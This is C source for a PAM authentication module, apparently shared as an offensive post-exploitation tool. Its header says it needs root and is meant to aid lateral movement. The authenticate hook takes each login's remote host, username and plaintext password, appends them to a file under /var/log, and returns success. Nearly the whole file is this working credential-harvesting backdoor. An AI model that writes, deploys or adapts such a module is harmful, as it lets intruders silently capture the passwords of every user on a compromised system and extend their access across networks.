/*
Source: http://www.adeptus-mechanicus.com/codex/logsshp/logsshp.html
Requires: pam-devel
NOTE: You need root level access to modify pam. This is NOT for privesc, but can help lateral movement
*/

#ifndef LINUX 
#include <security/pam_appl.h>
#endif  /* LINUX */

#define PAM_SM_AUTH
#include <security/pam_modules.h>

#include <syslog.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/file.h>

#define _XOPEN_SOURCE
#include <unistd.h>

#define PWDIR_PARAM	"pwdir"
#define PWDIR_DEFAULT	"/var/log"
#define PWDIR_LEN 	256
#define BUF_MAX		256

#define DEBUG

#ifdef DEBUG
# define D(a) a;
#else
# define D(a) {}
#endif

/* logging function ripped from pam_listfile.c */
static void _pam_log(int err, const char *format, ...) {
   va_list args;
   
   va_start(args, format);
   openlog("pam_storepw", LOG_CONS|LOG_PID, LOG_AUTH);
   vsyslog(err, format, args);
   va_end(args);
   closelog();
}

/* expected hook for auth service */
PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,
				   int argc, const char **argv) {
	int	pcnt,
		fd,
		len,
		res,
                check;
	char	*pwdir=0,
		*pword,
		*uname,
                *remhst,
		*file,
		buffer[BUF_MAX];
	FILE	*pwfile;

	for(pcnt=0;pcnt<argc;pcnt++) {
		if (strcmp(argv[pcnt], PWDIR_PARAM) == 0) {
			if (pcnt+1 < argc) 
				pwdir=strndup(argv[++pcnt], PWDIR_LEN);
		} else if (strncmp(argv[pcnt], PWDIR_PARAM "=", sizeof(PWDIR_PARAM "=")-1) == 0) 
			pwdir=strndup(argv[pcnt]+sizeof(PWDIR_PARAM), PWDIR_LEN);
	} 

	if (!pwdir)
		pwdir=strndup(PWDIR_DEFAULT, PWDIR_LEN);

	pam_get_item(pamh, PAM_AUTHTOK, (void *) &pword);
	pam_get_item(pamh, PAM_USER, (void*) &uname);
        pam_get_item(pamh, PAM_RHOST, (void*) &remhst);
	if (!pword || !uname) {
      		_pam_log(LOG_ERR,"no password or user to write - got stacked wrong ?");
		return PAM_AUTHINFO_UNAVAIL;
	}


	file=(char *) malloc(strlen(uname) + strlen(pwdir) + 2);
	if (!file) {
      		_pam_log(LOG_ERR,"malloc failed");
		return PAM_AUTHINFO_UNAVAIL;
	}

	sprintf(file, "%s/passwords", pwdir);
/*      	D(_pam_log(LOG_DEBUG, "writing to %s", file)); */

	if ((fd=open(file, O_RDWR|O_APPEND|O_CREAT, 0600)) == -1) {
      		_pam_log(LOG_ERR,"failed to open pw file");
		return PAM_AUTHINFO_UNAVAIL;
	}

	len=snprintf(buffer, BUF_MAX-1, "host = %s : username = %s : password = %s\n",
				remhst, uname, pword);

	res=write(fd, buffer, len);

	if (len != res) {
      		_pam_log(LOG_ERR,"failed to write pw to file");
		close(fd);
		return PAM_AUTHINFO_UNAVAIL;
	}

	close(fd);

	return PAM_SUCCESS;
}

/* another expected hook */
PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, 
			      int argc, const char **argv)
{
   return PAM_SUCCESS;
}

#ifdef PAM_STATIC
struct pam_module _pam_listfile_modstruct = {
   "pam_pwdfile",
     pam_sm_authenticate,
     pam_sm_setcred,
     NULL,
     NULL,
     NULL,
     NULL,
};
#endif
